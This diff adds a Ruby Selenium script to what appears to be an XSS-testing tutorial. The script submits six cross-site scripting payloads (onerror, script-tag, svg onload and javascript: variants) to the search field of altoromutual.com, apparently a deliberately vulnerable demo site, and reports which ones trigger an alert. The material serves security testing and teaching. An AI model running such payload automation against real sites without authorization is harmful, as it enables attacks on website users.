@@ -92,6 +92,49 @@ Let's test the page against XSS vulnerability. First I'll list what kind of acti
 
 
 ```ruby
+#!/usr/bin/env ruby
+#
+#
+require 'selenium-webdriver'
+
+payloads = 
+  [ 
+    "<video src=x onerror=alert(1);>",
+    "<img src=x onerror='alert(2)'>",
+    "<script>alert(3)</script>",
+    "<svg/OnlOad=prompt(4)>",
+    "javascript:alert(5)",
+    "alert(/6/.source)"
+  ]
+
+browser = Selenium::WebDriver.for :firefox
+browser.get "http://www.altoromutual.com/search.aspx?"
+
+wait = Selenium::WebDriver::Wait.new(:timeout => 20)
+
+payloads.each do |payload|
+  input = wait.until do
+      element = browser.find_element(:name, 'txtSearch')
+      element if element.displayed?
+  end
+  input.send_keys(payload)
+  input.submit
+  
+  begin 
+    wait.until do 
+      txt = browser.switch_to.alert
+      if (1..100) === txt.text.to_i
+	puts "Payload is working: #{payload}"
+	txt.accept 
+      end
+    end
+  rescue 
+    puts "False Positive: #{payload}"
+    next
+  end
+  
+end
+
 
 ```
 
